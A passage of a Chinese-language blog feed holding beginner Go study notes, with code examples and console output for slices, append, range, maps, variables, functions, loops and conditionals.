number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre><code>D:\go_sty\day3&gt;go run slicing_slices.gos== [2 423 22 6 8 2 56 9 29]s[1:4]== [423 22 6]s[:5]== [2 423 22 6 8]s[2:] [22 6 8 2 56 9 29]</code></pre><h2 id="构造slice"><a href="#构造slice" class="headerlink" title="构造slice"></a>构造slice</h2><pre><code>slice 由函数 make 创建。这会分配一个零长度的数组并且返回一个 slice 指向这个数组：a := make([]int, 5)  // len(a)=5为了指定容量，可传递第三个参数到 `make`：b := make([]int, 0, 5) // len(b)=0, cap(b)=5b = b[:cap(b)] // len(b)=5, cap(b)=5b = b[1:]      // len(b)=4, cap(b)=4</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    a <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>    <span class="token function">printSlice</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span>    b <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>    <span class="token function">printSlice</span><span class="token punctuation">(</span><span class="token string">"b"</span><span class="token punctuation">,</span>b<span class="token punctuation">)</span>    c <span class="token operator">:=</span> b<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>    <span class="token function">printSlice</span><span class="token punctuation">(</span><span class="token string">"c"</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span>    d <span class="token operator">:=</span> b<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>    <span class="token function">printSlice</span><span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">,</span>d<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">printSlice</span><span class="token punctuation">(</span>s <span class="token builtin">string</span><span class="token punctuation">,</span>x <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%s len=%d cap=%d %v\n"</span><span class="token punctuation">,</span>        s<span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">cap</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre><code>D:\go_sty\day3&gt;go run making_slice.goa len=5 cap=5 [0 0 0 0 0]b len=0 cap=5 []c len=2 cap=5 [0 0]d len=3 cap=3 [0 0 0]</code></pre><h2 id="nil-slice"><a href="#nil-slice" class="headerlink" title="nil slice"></a>nil slice</h2><pre><code>slice 的零值是nil一个nil的slice的长度和容量为0</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">var</span> z <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>z<span class="token punctuation">,</span><span class="token function">len</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">cap</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> z <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"nil!!!"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre><code>D:\go_sty\day3&gt;go run nil_slice.go[] 0 0nil!!!</code></pre><h2 id="向slice添加元素（append）"><a href="#向slice添加元素（append）" class="headerlink" title="向slice添加元素（append）"></a>向slice添加元素（append）</h2><pre><code>向 slice 添加元素是一种常见的操作，因此 Go 提供了一个内建函数 `append`。func append (s []T)append 的第一个参数 s 是一个类型为 T 的数组，其余类型为 T 的值将会添加到 slice。append 的结果是一个包含原 slice 所有元素加上新添加的元素的 slice。如果 s 的底层数组太小，而不能容纳所有值时，会分配一个更大的数组。 返回的 slice 会指向这个新分配的数组。</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">var</span> z <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span>    <span class="token function">printSlice</span><span class="token punctuation">(</span><span class="token string">"z"</span><span class="token punctuation">,</span>z<span class="token punctuation">)</span>    z <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>z<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token function">printSlice</span><span class="token punctuation">(</span><span class="token string">"z"</span><span class="token punctuation">,</span>z<span class="token punctuation">)</span>    z <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>z<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token function">printSlice</span><span class="token punctuation">(</span><span class="token string">"z"</span><span class="token punctuation">,</span>z<span class="token punctuation">)</span>    z <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>z<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>    <span class="token function">printSlice</span><span class="token punctuation">(</span><span class="token string">"z"</span><span class="token punctuation">,</span>z<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">printSlice</span><span class="token punctuation">(</span>s <span class="token builtin">string</span><span class="token punctuation">,</span>x <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%s len=%d cap=%d %v\n"</span><span class="token punctuation">,</span>s<span class="token punctuation">,</span><span class="token function">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">cap</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre><code>D:\go_sty\day3&gt;go run append.goz len=0 cap=0 []z len=1 cap=1 [0]z len=2 cap=2 [0 1]z len=6 cap=6 [0 1 2 3 4 5]</code></pre><h2 id="range"><a href="#range" class="headerlink" title="range"></a>range</h2><pre><code>for 循环的 range 格式可以对 slice 或者 map 进行迭代循环。</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token number">78</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">356</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">for</span> x<span class="token punctuation">,</span>y <span class="token operator">:=</span> <span class="token keyword">range</span> a<span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"2**%d=%d\n"</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre><code>D:\go_sty\day3&gt;go run range.go2**0=22**1=352**2=62**3=1252**4=782**5=92**6=356</code></pre><h2 id="range-续"><a href="#range-续" class="headerlink" title="range(续)"></a>range(续)</h2><pre><code>可以通过赋值给 _ 来忽略序号和值。</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    pow <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token keyword">range</span> pow <span class="token punctuation">{</span>        pow<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token function">uint</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> value <span class="token operator">:=</span> <span class="token keyword">range</span> pow <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre><code>D:\go_sty\day3&gt;go run range_continued.go1248163264128256512</code></pre><h2 id="map"><a href="#map" class="headerlink" title="map"></a>map</h2><pre><code>map 映射键到值。map 在使用之前必须用 make 而不是 new 来创建；值为 nil 的 map 是空的，并且不能赋值。</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">type</span> test4 <span class="token keyword">struct</span> <span class="token punctuation">{</span>    lat<span class="token punctuation">,</span>long <span class="token builtin">float64</span><span class="token punctuation">}</span><span class="token keyword">var</span> m <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span>test4<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    m <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span>test4<span class="token punctuation">)</span>    m<span class="token punctuation">[</span><span class="token string">"FUN"</span><span class="token punctuation">]</span> <span class="token operator">=</span> test4<span class="token punctuation">{</span>        <span class="token number">40.54412</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">884.4445554</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>m<span class="token punctuation">[</span><span class="token string">"FUN"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre><code>D:\go_sty\day3&gt;go run map.go{40.54412 -884.4445554}</code></pre><h2 id="map文法"><a href="#map文法" class="headerlink" title="map文法"></a>map文法</h2><pre><code>map 的文法跟结构体文法相似，不过必须有键名。如果顶级的类型只有类型名的话，可以在文法的元素中省略键名。</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">type</span> test5 <span class="token keyword">struct</span> <span class="token punctuation">{</span>    x<span class="token punctuation">,</span>y <span class="token builtin">float64</span><span class="token punctuation">}</span><span class="token keyword">var</span> m  <span class="token operator">=</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span>test5<span class="token punctuation">{</span>    <span class="token string">"kali"</span> <span class="token punctuation">:</span> test5<span class="token punctuation">{</span>        <span class="token number">123.456</span><span class="token punctuation">,</span><span class="token number">456.789</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token string">"fun"</span> <span class="token punctuation">:</span> test5<span class="token punctuation">{</span>        <span class="token number">789.123</span><span class="token punctuation">,</span><span class="token number">456.123</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//var m  = map[string]test5{</span><span class="token comment" spellcheck="true">//    "kali" : {123.456,456.789},</span><span class="token comment" spellcheck="true">//    "fun" : {789.123,456.123},</span><span class="token comment" spellcheck="true">//}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre><code>D:\go_sty\day3&gt;go run map_literals.gomap[kali:{123.456 456.789} fun:{789.123 456.123}]</code></pre><h2 id="修改map"><a href="#修改map" class="headerlink" title="修改map"></a>修改map</h2><h6 id="在map-m-中插入或者修改一个元素"><a href="#在map-m-中插入或者修改一个元素" class="headerlink" title="在map m 中插入或者修改一个元素"></a>在map m 中插入或者修改一个元素</h6><pre><code>m[key] = elem</code></pre><h6 id="获取元素："><a href="#获取元素：" class="headerlink" title="获取元素："></a>获取元素：</h6><pre><code>elem =  m[key]</code></pre><h6 id="删除元素："><a href="#删除元素：" class="headerlink" title="删除元素："></a>删除元素：</h6><pre><code>delete(m,key)</code></pre><h6 id="通过双赋值检测某个键值存在："><a href="#通过双赋值检测某个键值存在：" class="headerlink" title="通过双赋值检测某个键值存在："></a>通过双赋值检测某个键值存在：</h6><pre><code>elem,  ok = m[key]</code></pre><p>如果key在m中，则“ok”为“true”。不存在则为“false”，并且elem是map元素类型的零值。<br>同样，当从map中读取某个不存在的键值时，结果是map元素类型的零值。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    q <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span>    q<span class="token punctuation">[</span><span class="token string">"fun"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">45</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>q<span class="token punctuation">[</span><span class="token string">"fun"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    q<span class="token punctuation">[</span><span class="token string">"fun"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">41</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>q<span class="token punctuation">[</span><span class="token string">"fun"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token function">delete</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span><span class="token string">"fun"</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"the value:"</span><span class="token punctuation">,</span>q<span class="token punctuation">[</span><span class="token string">"fun"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    v<span class="token punctuation">,</span> ok <span class="token operator">:=</span> q<span class="token punctuation">[</span><span class="token string">"fun"</span><span class="token punctuation">]</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"the value:"</span><span class="token punctuation">,</span>v<span class="token punctuation">,</span><span class="token string">"really"</span><span class="token punctuation">,</span>ok<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre><code>D:\go_sty\day3&gt;go run mutating_map.go4541the value: 0the value: 0 really false</code></pre>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoLang_Day1</title>
      <link href="/2018/09/10/golang-day1/"/>
      <url>/2018/09/10/golang-day1/</url>
      
        <content type="html"><![CDATA[<h1 id="GoLang"><a href="#GoLang" class="headerlink" title="GoLang"></a>GoLang</h1><h2 id="创建hello-go"><a href="#创建hello-go" class="headerlink" title="创建hello.go"></a>创建hello.go</h2><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h2 id="执行hello-go"><a href="#执行hello-go" class="headerlink" title="执行hello.go"></a>执行hello.go</h2><pre class=" language-go"><code class="language-go"><span class="token keyword">go</span> run hello<span class="token punctuation">.</span><span class="token keyword">go</span>Hello</code></pre><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><pre class=" language-go"><code class="language-go"><span class="token keyword">go</span> build hexxo<span class="token punctuation">.</span><span class="token keyword">go</span>会生成一个hello<span class="token punctuation">.</span>exe执行hello<span class="token punctuation">.</span>exeHello （结果）</code></pre><h2 id="代码理解"><a href="#代码理解" class="headerlink" title="代码理解"></a>代码理解</h2><pre><code>如果是为了将代码编译成一个可执行程序，那么package必须是main如果是为了将代码编译成库，那么package则没有限制</code></pre><ul><li>main()为程序的主函数</li><li>fmt 是go的一个系统库 （路径为C:\Go\src\fmt）</li><li>fmt.Println()打印输出</li></ul><h2 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h2><p>格式：</p><pre><code>var 变量名 变量类型go语言中定义的函数必须被用到，否则会报错同时定义变量和赋值可以通过： 变量名：=值</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token comment" spellcheck="true">//import "fmt"</span><span class="token comment" spellcheck="true">//var c,python,java bool</span><span class="token comment" spellcheck="true">//func main()  {</span><span class="token comment" spellcheck="true">//    var i int</span><span class="token comment" spellcheck="true">//    fmt.Println(i,c,python,java)</span><span class="token comment" spellcheck="true">//}</span><span class="token keyword">var</span> i<span class="token punctuation">,</span>j  <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">var</span> c<span class="token punctuation">,</span>python<span class="token punctuation">,</span>java <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">,</span><span class="token string">"no!"</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>c<span class="token punctuation">,</span>python<span class="token punctuation">,</span>java<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">add</span><span class="token punctuation">(</span>x <span class="token builtin">int</span><span class="token punctuation">,</span>y <span class="token builtin">int</span><span class="token punctuation">)</span>  <span class="token builtin">int</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> x<span class="token operator">+</span>y<span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre class=" language-go"><code class="language-go">当两个或者多个连续的函数命名是同一个类型则除了最后一个类型外，其他省略。<span class="token keyword">func</span> <span class="token function">add</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y <span class="token builtin">int</span><span class="token punctuation">)</span>  <span class="token builtin">int</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> x<span class="token operator">+</span>y<span class="token punctuation">}</span></code></pre><h2 id="多值返回"><a href="#多值返回" class="headerlink" title="多值返回"></a>多值返回</h2><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">swap</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span><span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> x<span class="token punctuation">,</span>y<span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    a<span class="token punctuation">,</span>b <span class="token operator">:=</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">,</span><span class="token string">"word"</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h2 id="命名返回值"><a href="#命名返回值" class="headerlink" title="命名返回值"></a>命名返回值</h2><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">split</span><span class="token punctuation">(</span>sum <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span>y <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    x <span class="token operator">=</span> sum<span class="token operator">*</span><span class="token number">4</span>    y <span class="token operator">=</span> sum<span class="token number">-100</span>    <span class="token keyword">return</span>  x<span class="token punctuation">,</span>y<span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"math"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">var</span> x<span class="token punctuation">,</span>y <span class="token builtin">int</span>  <span class="token operator">=</span>  <span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span>    <span class="token keyword">var</span> f <span class="token builtin">float64</span>  <span class="token operator">=</span>  math<span class="token punctuation">.</span><span class="token function">Sqrt</span><span class="token punctuation">(</span><span class="token function">float64</span><span class="token punctuation">(</span>x<span class="token operator">*</span>x<span class="token operator">+</span>y<span class="token operator">*</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">//math.Sqrt 计算平方根</span>    <span class="token keyword">var</span> z <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token function">int</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>  z <span class="token operator">:=</span> <span class="token function">int</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><pre><code>常量的定义与变量相似，只不过使用const关键词。常量可以是字符，字符串，数字类型等常量不能使用 ;= 语法定义。</code></pre><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><pre><code>Go 只有一种循环结构-“for”循环for 也是Go 的“while”</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    sum <span class="token operator">:=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span> <span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">10</span> <span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>        sum <span class="token operator">+=</span> i    <span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>sum<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"math"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">sqrt</span><span class="token punctuation">(</span>x <span class="token builtin">float64</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> x <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token operator">-</span>x<span class="token punctuation">)</span><span class="token operator">+</span> <span class="token string">"i"</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span>  fmt<span class="token punctuation">.</span><span class="token function">Sprint</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span><span class="token function">Sqrt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//func pow(x,n,lim float64) float64  {</span><span class="token comment" spellcheck="true">//    if v := math.Pow(x,n); v &lt; lim{</span><span class="token comment" spellcheck="true">//        return v</span><span class="token comment" spellcheck="true">//    }</span><span class="token comment" spellcheck="true">//    return lim</span><span class="token comment" spellcheck="true">//}</span><span class="token comment" spellcheck="true">//func main()  {</span><span class="token comment" spellcheck="true">//    fmt.Println(</span><span class="token comment" spellcheck="true">//        pow(3,2,10),</span><span class="token comment" spellcheck="true">//        pow(3,3,20),</span><span class="token comment" spellcheck="true">//        )</span><span class="token comment" spellcheck="true">//}</span>值为：<span class="token number">1.4142135623730951</span> <span class="token number">2i</span></code></pre><h2 id="if-else"><a href="#if-else" class="headerlink" title="if else"></a>if else</h2><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"math"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">pow</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>n<span class="token punctuation">,</span>lim <span class="token builtin">float64</span><span class="token punctuation">)</span> <span class="token builtin">float64</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> v <span class="token operator">:=</span> math<span class="token punctuation">.</span><span class="token function">Pow</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span> v <span class="token operator">&lt;</span> lim<span class="token punctuation">{</span>        <span class="token keyword">return</span> v    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%g>=%g\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">,</span>lim<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> lim<span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>        <span class="token function">pow</span><span class="token 